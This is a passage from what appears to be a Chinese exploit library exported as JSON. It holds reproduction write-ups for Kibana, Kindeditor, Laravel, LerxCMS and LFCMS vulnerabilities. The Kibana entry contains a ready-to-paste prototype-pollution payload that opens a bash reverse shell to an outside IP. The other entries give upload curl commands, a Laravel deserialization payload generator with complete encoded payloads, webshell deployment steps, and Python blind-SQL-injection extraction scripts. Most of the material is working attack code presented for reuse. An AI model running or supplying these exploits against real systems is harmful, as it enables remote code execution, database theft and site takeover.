最简单的利用，设置一个cookie就可以导致拒绝服务： .es(*).props(label.__proto__.cookie=\"aaa\") Kibana 要复原的话可以在inspect调试器里删掉原型对象的cookie属性： Kibana DOS很好实现，怎么搞成RCE呢？根据经验，容易想到一些常见情形，如： if(obj.jsCode) eval(obj.jsCode) 这种白给的 express ejs模版引擎中的动态函数调用 作者并没有找到明显的代码执行点，但是在瞎点到canvas的时候，他发现控制台暴了很多错误（这是inpector的输出，也就是说如果启docker的时候加了-d的话，可能就错过这个RCE了...）。 Kibana 作者据此得出结论：kibana在创建新进程 创建进程可就是个敏感的行为了，能不能污染命令/参数呢？ 来动态看下进程创建的过程， Kibana 首先调用normalizeSpawnArguments.apply()处理参数， Kibana 跟进， Kibana 这里实际是在处理child_process.spawn(command[, args][, options])的第三个参数options。 Kibana 这里面的有些参数是undefined的，只有声明了才会处理，也即是我们可以污染的。 作者利用的就是这个env参数，它以键值对的形式向子进程传递环境变量（我尝试了一些其它参数，没发现可利用的）。 能控制进程的环境变量了，有什么用呢？我们不知道子进程会对环境变量做些什么操作啊，这是容易被忽视的一个重点。 回想下控制台报的错：\\\"Starting inspector on 0.0.0.0:9229 failed: address already in use\\\"。 这句话透露出的是：此时正在创建一个node命令进程，并且使用了--inpect:0.0.0.0:9229参数。 这下目标就清晰了，我们能控制的node的环境变量。 在node中，有一个NODE_OPTIONS变量， Kibana 通过这个变量，可以覆盖node进程的参数。 也就是说，现在我们能控制node进程的参数了。这就很有用了，比如--eval参数是可以直接执行代码的。 Kibana 但是，NODE_OPTIONS似乎考虑到了这种潜在的安全问题，它只能使用部分参数，向--eval这种是用不了的。 不过作者找到了另一个参数--require， Kibana 这个有点像php里的auto_prepend_file，预加载一个文件。 Kibana 现在我们可以看成有一个文件包含的洞了，怎么RCE呢？ 通常，我们都会上传一个文件再包含，或者去包含web服务器日志/SSH日志。 作者这里利用的方法也十分巧妙，Linux下一切皆文件，我们已经能控制子进程的环境变量，也就是能控制/proc/self/environ这个文件，直接包含这个文件不就好了。 Kibana 最后payload如下： 将POC里的反链IP地址换成自己的，然后在目标机器上的 Timelion 选项下将以下 POC 粘贴进去，然后点击 Run 运行： .es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"bash -c \\'bash -i>& /dev/tcp/10.70.53.113/6666 0>&1\\'\");//') .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ') 然后自己机器开启监听，再点击 Canvas Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:55:36 "},"Web安全/Kindeditor/（CVE-2017-1002024）Kindeditor =4.1.11 上传漏洞/（CVE-2017-1002024）Kindeditor =4.1.11 上传漏洞.html":{"url":"Web安全/Kindeditor/（CVE-2017-1002024）Kindeditor =4.1.11 上传漏洞/（CVE-2017-1002024）Kindeditor =4.1.11 上传漏洞.html","title":"（CVE-2017-1002024）Kindeditor =4.1.11 上传漏洞","keywords":"","body":"（CVE-2017-1002024）Kindeditor \\ 一、漏洞简介 漏洞存在于kindeditor编辑器里，你能上传.txt和.html文件，支持php/asp/jsp/asp.net,漏洞存在于小于等于kindeditor4.1.11编辑器中 二、漏洞影响 Kindeditor \\ 三、复现过程 curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/php/upload_json.php?dir=file curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/asp/upload_json.asp?dir=file curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/jsp/upload_json.jsp?dir=file curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/aspx/upload_json.aspx?dir=file ​```返回值为路径 json文件地址 /asp/upload_json.asp /asp.net/upload_json.ashx /jsp/upload_json.jsp /php/upload_json.php 上传路径 kindeditor/asp/upload_json.asp?dir=file kindeditor/asp.net/upload_json.ashx?dir=file kindeditor/jsp/upload_json.jsp?dir=file kindeditor/php/upload_json.php?dir=file 查看版本信息 http://www.0-sec.org/kindeditor//kindeditor.js Kindeditor 构造poc Uploader KindEditor.ready(function(K) { var uploadbutton = K.uploadbutton({ button : K(‘#uploadButton‘)[0], fieldName : ‘imgFile‘, url : ‘http://www.0-sec.org/kindeditor/jsp/upload_json.jsp?dir=file‘, afterUpload : function(data) { if (data.error === 0) { var url = K.formatUrl(data.url, ‘absolute‘); K(‘#url‘).val(url);} }, }); uploadbutton.fileBox.change(function(e) { uploadbutton.submit(); }); }); Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:55:40 "},"Web安全/Laravel/（CVE-2018-15133）Laravel 反序列化远程命令执行漏洞/（CVE-2018-15133）Laravel 反序列化远程命令执行漏洞.html":{"url":"Web安全/Laravel/（CVE-2018-15133）Laravel 反序列化远程命令执行漏洞/（CVE-2018-15133）Laravel 反序列化远程命令执行漏洞.html","title":"（CVE-2018-15133）Laravel 反序列化远程命令执行漏洞","keywords":"","body":"（CVE-2018-15133）Laravel 反序列化远程命令执行漏洞 一、漏洞简介 利用前需要知道app_key，才可以进行利用。 二、漏洞影响 Laravel framework 5.5.x\\ Laravel framework 5.6.x\\ 三、复现过程 漏洞分别可以在两个地方触发一个是直接添加在 cookie 字段，例如： Cookie: ATTACK=payload ；另一处是在 HTTP Header 处添加 X-XSRF-TOKEN 字段，例如： X-XSRF-TOKEN: payload 。 通过Cookie触发RCE 通过 Cookie 触发 RCE 的 EXP 如下（这里payload中执行的命令是 curl 127.0.0.1:8888 ）： POST / HTTP/1.1 Host: www.0-sec.org:8000 Cookie: XDEBUG_SESSION=PHPSTORM; ATTACK=eyJpdiI6ImRhSTdpRkhWTFowVHNtNDMyZW5wWlE9PSIsInZhbHVlIjoiRHRRRXpRNUhkeG8rQ0s0a21qRmpzUHNkZ0lBaFpsVjlvYk1uZmtwOVpRVFZsdmNKSUhMQnJ0UlBWeHhrbElZb0ZaRnRmMjFlbTNSNXRXZGxCeEF2clNvbk5HT2FDZEEwSGVKU2VuUkFSeVhXTUEwVzFUYlRlc2RsWk1scEg3eWRUKzljRHBWQmEzMERRR0gydG4zYURzWEFcL2djUmFDVGJ5M2NMREVvMDhmeEE0dm5FTVJcL3UwZHBsUjhxajBHbFVBaHVRTWRzN3QwNU9XdWdISWZPaklkXC80alpKQjZEMlJTQjdVXC8wZ3BoNXVXWVFRK1NUSVM5OVhkSXRuSXpHZWRMcUJnR0RwVjlLeDNPUHMyNFpMbWJRPT0iLCJtYWMiOiIxM2M3YThiNmI4MWNkZmI1YjNhMGEzZDRjMDdkYTJiY2MyNzZhOWZkYzUwM2NiOTg1MGRiMTk0ZGU1MjhhOWE1In0=; Content-Type: application/x-www-form-urlencoded Connection: close Content-Length: 0 通过HTTP Header触发RCE 通过 HTTP Header 触发 RCE 的 EXP 如下（这里payload中执行的命令是 curl 127.0.0.1:8888 ）： POST / HTTP/1.1 Host: www.0-sec.org:8000 Cookie: XDEBUG_SESSION=PHPSTORM; X-XSRF-TOKEN: eyJpdiI6ImRhSTdpRkhWTFowVHNtNDMyZW5wWlE9PSIsInZhbHVlIjoiRHRRRXpRNUhkeG8rQ0s0a21qRmpzUHNkZ0lBaFpsVjlvYk1uZmtwOVpRVFZsdmNKSUhMQnJ0UlBWeHhrbElZb0ZaRnRmMjFlbTNSNXRXZGxCeEF2clNvbk5HT2FDZEEwSGVKU2VuUkFSeVhXTUEwVzFUYlRlc2RsWk1scEg3eWRUKzljRHBWQmEzMERRR0gydG4zYURzWEFcL2djUmFDVGJ5M2NMREVvMDhmeEE0dm5FTVJcL3UwZHBsUjhxajBHbFVBaHVRTWRzN3QwNU9XdWdISWZPaklkXC80alpKQjZEMlJTQjdVXC8wZ3BoNXVXWVFRK1NUSVM5OVhkSXRuSXpHZWRMcUJnR0RwVjlLeDNPUHMyNFpMbWJRPT0iLCJtYWMiOiIxM2M3YThiNmI4MWNkZmI1YjNhMGEzZDRjMDdkYTJiY2MyNzZhOWZkYzUwM2NiOTg1MGRiMTk0ZGU1MjhhOWE1In0=; Content-Type: application/x-www-form-urlencoded Connection: close Content-Length: 0 每个网站的app_key不同，生成的代码不同，可别傻傻的直接用上面的代码了。 使用PHPGGC生成反序列化代码 https://github.com/ianxtianxt/phpggc 运行phpggc 的条件是php cli的版本>=5.6 ./phpggc 网站/路径 system id Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjg6InVuYW1lIC1hIjt9 使用第脚本生成最终payload ./cve-2018-15133.php app_key phpggc加密的内容 例子： ./cve-2018-15133.php 9UZUmEfHhV7WXXYewtNRtCxAYdQt44IAgJUKXk2ehRk= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjg6InVuYW1lIC1hIjt9 'PoC for Unserialize vulnerability in Laravel Laravel反序列化远程命令执行漏洞/media/rId26.png) curl www.0-sec.org:8000 -X POST -H 'X-XSRF-TOKEN: eyJpdiI6Imp3c1BUejE5aGFFUVM4a0NcLzIyODBnPT0iLCJ2YWx1ZSI6InZrTEdOY2o1NlVJdlltWFl3OFBxTEY1a1pCZWlaSDRSdXM1STNSa21sSE5Cb3hFd09cL2JUdU0wWHhjK0dUU0dYQzlTd3ZYSm50NTc4NW90UnNrZW5mMHc2RHdcLzZia01cL29wVUhjQml5cCtmZ1VcL2lwbnVySG52MHEwWXdZMVFVSXhWYjFEQlwveTZPQ3JORnRYdVQyeVFnODM1UGVCSVFcL3B6RGs2VDczOTZEbkFKdFwvc3lpZXBtcUo4VllLNU4zS0pMV3ZBUlNXZDRHRmNnOG1vOFZUWDVicE5uV0FcL1NSXC9HRjh2XC9YR2pLUDlEdlEwaytWRHl5TFhvb3RXM0Y4ejNXIiwibWFjIjoiOTMwMTNkZDYwYzNjYmQ1YTg4ZjRmNjM2NmZhMzBjNzA5NTgzYmI0ZWM3Y2MzOGM4YmExYjM2ZTVkOTIzZDJjYyJ9'| head -n 2 ps：也可以使用burp poc cve-2018-15133.php #!/usr/bin/env php \" . PHP_EOL; exit(); } $key = $argv[1]; $value = $argv[2]; $cipher = 'AES-256-CBC'; // or 'AES-128-CBC' $iv = random_bytes(openssl_cipher_iv_length($cipher)); // instead of rolling a dice ;) $value = \\openssl_encrypt( base64_decode($value), $cipher, base64_decode($key), 0, $iv ); if ($value === false) { exit(\"Could not encrypt the data.\"); } $iv = base64_encode($iv); $mac = hash_hmac('sha256', $iv.$value, base64_decode($key)); $json = json_encode(compact('iv', 'value', 'mac')); if (json_last_error() !== JSON_ERROR_NONE) { echo \"Could not json encode data.\" . PHP_EOL; exit(); } //$encodedPayload = urlencode(base64_encode($json)); $encodedPayload = base64_encode($json); echo \"HTTP header for POST request: \\nX-XSRF-TOKEN: \" . $encodedPayload . PHP_EOL; Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:55:41 "},"Web安全/Laravel/（CVE-2019-9081）Laravel 5.7 反序列化rce/（CVE-2019-9081）Laravel 5.7 反序列化rce.html":{"url":"Web安全/Laravel/（CVE-2019-9081）Laravel 5.7 反序列化rce/（CVE-2019-9081）Laravel 5.7 反序列化rce.html","title":"（CVE-2019-9081）Laravel 5.7 反序列化rce","keywords":"","body":"（CVE-2019-9081）Laravel 5.7 反序列化rce 一、漏洞简介 Laravel Framework 5.7.x版本中的Illuminate组件存在安全漏洞。远程攻击者可利用该漏洞执行代码。 二、漏洞影响 Laravel 5.7 三、复现过程 漏洞分析 漏洞demo 由于我没有找到laravel框架触发反序列化的点，因此我们需要自己构造一个漏洞demo，用作poc的验证。 在routes/web.php文件中添加这样一条路由记录:Route::get('/index', 'TaskController@index'); 接下来在app/Http/Controllers文件夹下创建文件TaskController.php，源码如下: 首先我们来对比一下laravel v5.6和laravel v5.7下vendor/laravel/framework/src/Illuminate/Foundation/Testing文件夹中的区别： Laravel5.7反序列化rce/media/rId26.png) Laravel5.7反序列化rce/media/rId27.png) 可以看到在v5.7版本中多了一个PendingCommand.php文件。我们再来看看官方文档对于这个文件的解释。 Laravel5.7反序列化rce/media/rId28.png) 其主要功能是用作命令执行，并且获取输出内容。 阅读代码我们可以看到PendingCommand.php文件定义了PendingCommand类，该类存在__destruct方法，忘了哪位大牛说过，__destruct永远是反序列化漏洞的最佳攻击点。而在PendingCommand类的__destruct方法中调用了该类的run方法。在run方法的头顶，赫然写着Execute the command.。攻击思路很明显了，通过反序列化触发PendingCommand类的__destruct析构函数，进而调用其run方法实现代码执行。接下来就要开始构造pop链。 在构造payload之前，我先简单的介绍一下PendingCommand类中的几个重要属性： $this->app; //一个实例化的类 Illuminate\\Foundation\\Application $this->test; //一个实例化的类 Illuminate\\Auth\\GenericUser $this->command; //要执行的php函数 system $this->parameters; //要执行的php函数的参数 array('id') 我们传入payload看看具体流程走向。 Laravel5.7反序列化rce/media/rId29.png) 将我们构造好的序列化数据通过参数p传入，查看调用栈可以看到，在进行反序列化时，成功进入PendingCommand类的析构函数。并且这里的$this->hasExecuted默认定义就是false。导致我们很顺利进入$this->run()方法。run方法的代码如下: Laravel5.7反序列化rce/media/rId30.png) 我们首先需要进入$this->mockConsoleOutput()方法。这个方法的也是困扰了我很久，差一点没能绕过这个方法。最后是在吃完晚饭之后，灵光一现突然想到bypass的方法。我们跟进看看代码逻辑。 Laravel5.7反序列化rce/media/rId31.png) 在$this->mockConsoleOutput()使用Mockery::mock实现对象模拟，具体如何实现我们不去关心，目前的首要任务是顺利走通这段代码。我们将关注点放在$this->createABufferedOutputMock()，继续跟进$this->createABufferedOutputMock()函数。 Laravel5.7反序列化rce/media/rId32.png) 这里又进行一次对象模拟，但是着不重要，我们重点看我打上箭头的地方。要求获取$this->test这个类中的expectedOutput属性，并且遍历该属性。按道理来说$this->test这个类应该存在expectedOutput属性，我们才能顺利地执行下文代码。很不幸，在我们可以实例化的类中，没有一个类存在expectedOutput属性。只有一些测试类才有这个属性。这也是困扰我很久的地方。 但我们仔细看看这段代码会发现，我们需要的只是一个返回内容而已，只需要有返回内容，使得代码进入循环流程我们便能走通这段代码。因此我们可以利用__get魔术方法来返回我们需要的内容。我这里选取的是Illuminate\\Auth\\GenericUser类。其__get魔术方法的逻辑如下： Laravel5.7反序列化rce/media/rId33.png) 而$this->attributes通过反序列化是可控的，因此我们可以构造$this->attributes键名为expectedOutput的数组。这样一来$this->test->expectedOutput就会返回$this->attributes中键名为expectedOutput的数组。$this->createABufferedOutputMock()的代码也就顺利走通了。 Laravel5.7反序列化rce/media/rId34.png) 接下来回到$this->mockConsoleOutput()方法，可以看到这里有一段和$this->createABufferedOutputMock()中相似的代码，我们的目的只是走通这段代码，进入下面的流程，因此不需要关心他具体的实现，只要能顺利执行，不报错，不产生异常就行。使用和$this->createABufferedOutputMock()同样的绕过办法，在$this->attributes中定义键名为expectedQuestions的数组即可。 Laravel5.7反序列化rce/media/rId35.png) 之后，我们继续运行就能走出$this->mockConsoleOutput()方法。接下来，就是最关键的产生漏洞的代码点。 $exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters);。 这行代码相当令人费解，我为了更加直观的表述，新增两个变量。 $aaa=Kernel::class; $fff=$this->app[Kernel::class]; $exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters); Kernel::class在这里是一个固定值Illuminate\\Contracts\\Console\\Kernel，我们不去管他。重点是$this->app[Kernel::class]这句代码。跟踪这句代码，我们会得到以下调用栈： Laravel5.7反序列化rce/media/rId36.png) 通过整体跟踪，猜测开发者的本意应该是实例化Illuminate\\Contracts\\Console\\Kernel这个类，但是在getConcrete这个方法中出了问题，导致可以利用php的反射机制实例化任意类。问题出在vendor/laravel/framework/src/Illuminate/Container/Container.php的704行，可以看到这里判断$this->bindings[$abstract])是否存在，若存在则返回$this->bindings[$abstract]['concrete']。 $bindings是vendor/laravel/framework/src/Illuminate/Container/Container.php文件中Container类中的属性。因此我们只要寻找一个继承自Container的类，即可通过反序列化控制 $this->bindings属性。而Illuminate\\Foundation\\Application恰好继承自Container类，这就是我选择Illuminate\\Foundation\\Application对象放入$this->app的原因。由于我们已知$abstract变量为Illuminate\\Contracts\\Console\\Kernel，所以我们只需通过反序列化定义Illuminate\\Foundation\\Application的$bindings属性存在键名为Illuminate\\Contracts\\Console\\Kernel的二维数组就能进入该分支语句，返回我们要实例化的类名。在这里返回的是Illuminate\\Foundation\\Application类。 Laravel5.7反序列化rce/media/rId37.png) 之后便步出$this->getConcrete方法。使用$this->isBuildable方法，判断是否可进行实例化。 Laravel5.7反序列化rce/media/rId38.png) 具体判断逻辑如下： Laravel5.7反序列化rce/media/rId39.png) 很明显我们现在不满足条件，因此进入$this->make方法，同样的流程再循环一遍。第二遍循环时，在$this->getConcrete环节还是获取我们定义的Illuminate\\Foundation\\Application，这样一来使得$this->isBuildable中的$concrete === $abstract条件成立。因此我们进入$this->build方法。 Laravel5.7反序列化rce/media/rId40.png) 在$this->build方法中，就能看到使用ReflectionClass反射机制，实例化我们传入的类。 Laravel5.7反序列化rce/media/rId41.png) 成功实例化类，最后逐层返回我们创建的对象。最后我们可以知道通过我们传入的payload，$this->app[Kernel::class]最终返回的内容就是我们创建的Illuminate\\Foundation\\Application类的对象。 Laravel5.7反序列化rce/media/rId42.png) Laravel5.7反序列化rce/media/rId43.png) 继续往下跟踪，已经接近胜利了。在返回一个对象之后，又调用了call方法。实际上Illuminate\\Foundation\\Application类没有call方法，但是它的父类Illuminate\\Container\\Container是有call方法的。因此，在这里会直接跳转到Illuminate\\Container\\Container类中的call方法。 Laravel5.7反序列化rce/media/rId44.png) 跟进BoundMethod对象的call方法。 Laravel5.7反序列化rce/media/rId45.png) 不满足第一个分支语句，直接进入第二行。前面的static::callBoundMethod只是判断我们的$callback是否为数组。这个不重要，我们关注后面的匿名函数。这个匿名函数直接调用call_user_func_array，并且第一个参数我们可控，参数值为system，第二个参数由static::getMethodDependencies方法返回。跟进static::getMethodDependencies方法看看。 Laravel5.7反序列化rce/media/rId46.png) static::getCallReflector($callback)这句用于利用反射获取$callback的对象，继续往下执行static::addDependencyForCallParameter，会对$callback的对象添加一些参数，但是这些不重要。最后一行才是关键。 最后将我们传入的$parameters参数数组和$dependencies数组合并，$dependencies数组为空。 最后在BoundMethod对象的call方法中我们相当于执行了以下代码: call_user_func_array('system',array('id')) 此时run函数中$exitcode值即为命令的执行结果 Laravel5.7反序列化rce/media/rId47.png) payload： http://www.0-sec.org/laravel-5.7/public/index.php/index?code=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A2%3A%22id%22%3B%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A2%3A%7Bs%3A22%3A%22%00%2A%00hasBeenBootstrapped%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A4%3A%22test%22%3BO%3A27%3A%22Illuminate%5CAuth%5CGenericUser%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00attributes%22%3Ba%3A2%3A%7Bs%3A14%3A%22expectedOutput%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7Ds%3A17%3A%22expectedQuestions%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7D%7D%7D%7D Laravel5.7反序列化rce/media/rId48.png) POC command = $command; $this->parameters = $parameters; $this->test=$class; $this->app=$app; } } } namespace Illuminate\\Auth{ class GenericUser{ protected $attributes; public function __construct(array $attributes){ $this->attributes = $attributes; } } } namespace Illuminate\\Foundation{ class Application{ protected $hasBeenBootstrapped = false; protected $bindings; public function __construct($bind){ $this->bindings=$bind; } } } ?> array(\"0\"=>\"1\"),\"expectedQuestions\"=>array(\"0\"=>\"1\"))),new Illuminate\\Foundation\\Application(array(\"Illuminate\\Contracts\\Console\\Kernel\"=>array(\"concrete\"=>\"Illuminate\\Foundation\\Application\")))))); ?> 运行chain.php文件即可得到payload，将payload传入p参数即可。 参考链接 https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/ https://xz.aliyun.com/t/5510\\#toc-1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:55:49 "},"Web安全/LerxCMS/LerxCMS 6.5 后台ssrf getshell/LerxCMS 6.5 后台ssrf getshell.html":{"url":"Web安全/LerxCMS/LerxCMS 6.5 后台ssrf getshell/LerxCMS 6.5 后台ssrf getshell.html","title":"LerxCMS 6.5 后台ssrf getshell","keywords":"","body":"LerxCMS 6.5 后台ssrf getshell 一、漏洞简介 LerxCMS 6.5 版本后台在加载模板时存在SSRF漏洞，通过深入利用该漏洞可以通过远程加载指定的模板文件来Getshell~ 二、漏洞影响 LerxCMS 6.5 三、复现过程 漏洞分析 文件位置：lerx_v6.3.0\\WebContent\\WEB-INF\\views\\jsp\\templet\\portal\\remote.jsp 漏洞描述：下载时未对来源做检查，只要URL非空即可，故而存在SSRF： lerx_v6.3.0\\src\\com\\lerx\\handlers\\TempletMainPortalHandler.java 之后初始化相关设置，并连接提供的URL下载文件,此处的template的路径被初始化为：templates/portal 之后对zip压缩包进行解压，并通过for循环遍历读取zip中的文件并赋值到templetPortalDir目录下，也就是templates/portal目录，之后还会进行一次可读权限赋予操作： 在以上整个过程中，未对url的请求源做安全检查存在SSRF，同时由于模板如果是zip文件则会对其进行一次解压缩操作，故而攻击者可以伪造模板下载服务，之后下载存在shell.jsp文件的压缩包并解压到templates/portal目录，从而成功写入shell到目标站点~ 漏洞复现 首先，在本地将冰蝎提供的shell.jsp打包为zip文件，同时使用python开启一个simpleHTTP服务，来模拟攻击者远程主机提供模板下载服务： 之后使用管理账号lerx/ilovelerx登陆后台，进入到模板页面，选择模板加载： 之后选择默认模板 之后点击获取，同时使用burpsuite抓包： 之后修改url为攻击者主机提供的下载服务对应的地址： 之后释放请求数据包，在攻击者提供的下载服务端成功接受到请求，可见存在SSRF： 之后在服务器端成功上载shell.jsp文件(我们的模板为shell.zip，上载过程中会进行解压缩操作将我们的shell.jsp木马文件解压到templates/portal目录目录下面)： 之后使用冰蝎进行连接： 连接成功： 执行命令： 参考链接 https://xz.aliyun.com/t/8179\\#toc-2 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:00 "},"Web安全/LFCMS/LFCMS AjaxController.class.php 前台sql注入漏洞/LFCMS AjaxController.class.php 前台sql注入漏洞.html":{"url":"Web安全/LFCMS/LFCMS AjaxController.class.php 前台sql注入漏洞/LFCMS AjaxController.class.php 前台sql注入漏洞.html","title":"LFCMS AjaxController.class.php 前台sql注入漏洞","keywords":"","body":"LFCMS AjaxController.class.php 前台sql注入漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞起始点位于/Application/Home/Controller/AjaxController.class.php文件中的randMovie方法，代码如下 第七行代码中调用了Ajax模型中的randMovie方法，同时limit和category是我们输入的可控的参数，跟进randMovie方法 public function randMovie($limit=6,$category='') { if($category) { $type='and category='.$category; } $prefix=C('DB_PREFIX'); $mlist=M()->query('SELECT * FROM `'.$prefix.'movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `'.$prefix.'movie`)-(SELECT MIN(id) FROM `'.$prefix.'movie`))+(SELECT MIN(id) FROM `'.$prefix.'movie`)) AS idx) AS t2 WHERE t1.id >= t2.idx '.$type.' ORDER BY t1.id LIMIT '.$limit); foreach($mlist as $key=>$value) { $list[$key]=D('Tag')->movieChange($value,'movie'); } return $list; } 在这里注意到$type与$limit在sql语句执行时均没有被单引号包裹，直接拼接到语句当中，这里就存在了sql注入的可能，首先我们在movie表里放一条数据，看一下正常执行时sql语句是如何执行的 查看数据库日志可以得到如下sql语句 SELECT * FROM `lf_movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `lf_movie`)-(SELECT MIN(id) FROM `lf_movie`))+(SELECT MIN(id) FROM `lf_movie`)) AS idx) AS t2 WHERE t1.id >= t2.idx and category=2 ORDER BY t1.id LIMIT 1 接着来尝试下进行注入，测试链接如下 http://www.0-sec.org/index.php/Ajax/randMovie?limit=1&category=2 and sleep(5) 页面确实延迟了5秒，那么接着看一下后端数据库的语句 SELECT * FROM `lf_movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `lf_movie`)-(SELECT MIN(id) FROM `lf_movie`))+(SELECT MIN(id) FROM `lf_movie`)) AS idx) AS t2 WHERE t1.id >= t2.idx and category=2 and sleep(5) ORDER BY t1.id LIMIT 1 基本可以判断该处存在着可用的注入点，接下来编写脚本跑一下数据库用户名试试 import requests url = 'http://www.0-sec.org/index.php/Ajax/randMovie?limit=1&category=2 and ' s = requests.session() result = \"\" for i in range(1,50): print('==========================') for j in range(32,127): payload = \"if((ascii(substr((select user()),{},1))={}),sleep(5),0)\".format(i,j) temp = url+payload try: s.get(temp,timeout=5) except: result+= chr(j) print(result) break 相同原理的利用点同样不止一个，如/Application/Home/Controller/PlayerController.class.php文件中的down方法调用了模型movie中的getPlayerUrl方法，该方法的pid参数同样可以注入 参考链接 https://xz.aliyun.com/t/7844 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:04 "},"Web安全/LFCMS/LFCMS NewsController.class.php 前台sql注入漏洞/LFCMS NewsController.class.php 前台sql注入漏洞.html":{"url":"Web安全/LFCMS/LFCMS NewsController.class.php 前台sql注入漏洞/LFCMS NewsController.class.php 前台sql注入漏洞.html","title":"LFCMS NewsController.class.php 前台sql注入漏洞","keywords":"","body":"LFCMS NewsController.class.php 前台sql注入漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 回到lfcms，漏洞起始点位于/Application/Home/Controller/NewsController.class.php中的index方法，代码如下 在代码第六行调用了News模型中的detail方法，跟进该方法 可以看到在第八行进而调用了tp的find方法，在该版本中find方法是可以进行注入的，同时参数$id是我们可控的，首先我们来看一下正常的输入情况(图中域名为本地搭建解析) 根据tp3.2的注入点构造一下语句，访问如下链接 http://www.0-sec.org/index.php/Home/News/index/?id[alias]=where id=1 and 1-- 页面与正常访问相比没有变化，查看一下数据库日志，看下后端数据库语句 可以看到在id处已经可以进行sql语句的拼接，也就证明该处是存在可利用的注入点的，由于本套程序对于错误信息是有屏蔽的，在这里我们很难利用报错注入带出数据，在该处可以考虑使用布尔类型的盲注，两种回显状态如下 接着写一下脚本（以查询数据库名为例） import requests url = 'http://lfcms.com/index.php/Home/News/index/?id[alias]=where id=1 and ' result = '' for i in range(1,50): print('-----------------------------') for j in range(32,127): payload = 'if((ascii(substr((select database()),{},1))={}),1,0)--'.format(i,j) temp = url+payload try: html = requests.get(temp,timeout=10) if 'tttest' in html.text: result+=chr(j) print(result) break except: print('[-]error') 结果如下 相同原理的利用点还有很多，如位于/Application/Home/Controller/MovieController.class.php中的index方法的id参数，这里就不再重复分析了 参考链接 https://xz.aliyun.com/t/7844 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:05 "},"Web安全/LFCMS/LFCMS 后台getshell/LFCMS 后台getshell.html":{"url":"Web安全/LFCMS/LFCMS 后台getshell/LFCMS 后台getshell.html","title":"LFCMS 后台getshell","keywords":"","body":"LFCMS 后台getshell 一、漏洞简介 二、漏洞影响 三、复现过程 该漏洞可以利用的原因一是在于后台对于站点配置数据没有做好过滤，二是利用了tp3.2版本下本身存在的缓存漏洞，漏洞起始利用点位于/Application/Admin/Controller/ConfigController.class.php中的save方法，代码如下 该处将后台设置的配置项直接存储在数据库中，接着当用户访问站点前台页面时，会调用/Application/Home/Controller/HomeController.class.php中的_initialize方法，部分代码如图 当第一次访问时，会调用第二十一行的缓存函数写缓存文件，在这里如果在设置配置数据的时候写入恶意的PHP代码，就可以在缓存文件中写入我们想要执行的代码，进而getshell，首先我们来到后台用户配置设置处 提交数据抓取数据包，在其中一个设置项中填入php代码，由于缓存文件对于配置项进行了注释，为了逃逸注释我们需要另起一行写入PHP代码并将后面的无用数据注释掉，如图 然后访问前台页面生成缓存文件，缓存文件在/Application/Runtime/Temp/目录下，文件名为缓存数据名称的MD5值，在这里也就是DB_CONFIG_DATA的MD5值，我们直接访问缓存文件 http://www.0-sec.org/Application/Runtime/Temp/95a1fe934b68ebfee8468bf0bc4f0000.php 成功的写入了PHP代码 参考链接 https://xz.aliyun.com/t/7844\\#toc-4 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:56:08 "},"Web安全/LFCMS/LFCMS 后台任意文件读取漏洞/LFCMS 后台任意文件读取漏洞.html":{"url":"Web安全/LFCMS/LFCMS 后台任意文件读取漏洞/LFCMS 后台任意文件读取漏洞.html","title":"LFCMS 后台任意文件读取漏洞","keywords":"","body":"LFCMS 后台任意文件读取漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 